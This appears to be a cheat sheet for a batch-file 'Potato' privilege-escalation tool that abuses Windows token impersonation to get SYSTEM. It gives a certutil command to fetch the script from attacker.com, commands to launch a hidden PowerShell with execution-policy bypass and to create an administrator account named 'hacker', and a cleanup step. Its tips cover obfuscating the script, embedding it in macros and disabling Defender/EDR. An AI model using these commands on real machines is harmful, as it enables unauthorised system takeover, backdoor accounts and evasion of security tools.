# ================= BatPotato =================
# Description:
# BatPotato is a simple BAT file implementation of the Rotten/Juicy/Rogue Potato exploit family.
# It performs privilege escalation via Windows token impersonation using COM services.

# Repository (Archived/Community):  
# https://github.com/hatRiot/batpotato (or other forks from security researchers)

# ---------------- SETUP ----------------
# 1. Transfer BatPotato.bat to the target machine
# Example using certutil:
certutil -urlcache -f http://attacker.com/BatPotato.bat BatPotato.bat

# 2. Ensure the current user is in a group that can trigger service tokens
# Example: User is a local admin or has SeImpersonatePrivilege

# ---------------- USAGE ----------------
# Execute BatPotato.bat with a command to run as SYSTEM:
BatPotato.bat "cmd.exe"

# Example: Open SYSTEM-level command shell
BatPotato.bat "powershell.exe -NoP -NonI -W Hidden -Exec Bypass"

# Example: Add admin user (replace 'hacker' and '1234' accordingly)
BatPotato.bat "net user hacker 1234 /add && net localgroup administrators hacker /add"

# ---------------- NOTES ----------------
# - May trigger AV/EDR alerts due to known potato behavior
# - Only works if the target is vulnerable to token impersonation
# - Does not require external compilation (BAT-based)

# ---------------- VERIFICATION ----------------
# After successful run:
whoami        # Should return: NT AUTHORITY\SYSTEM

# ---------------- CLEANUP ----------------
del BatPotato.bat

# ---------------- TIPS ----------------
# Use as backup when binary-based Potato tools are blocked
# Can be obfuscated using BAT encoders or embedded in macros/scripts
# Recommended: Disable Defender/EDR before use (in lab or red team settings)
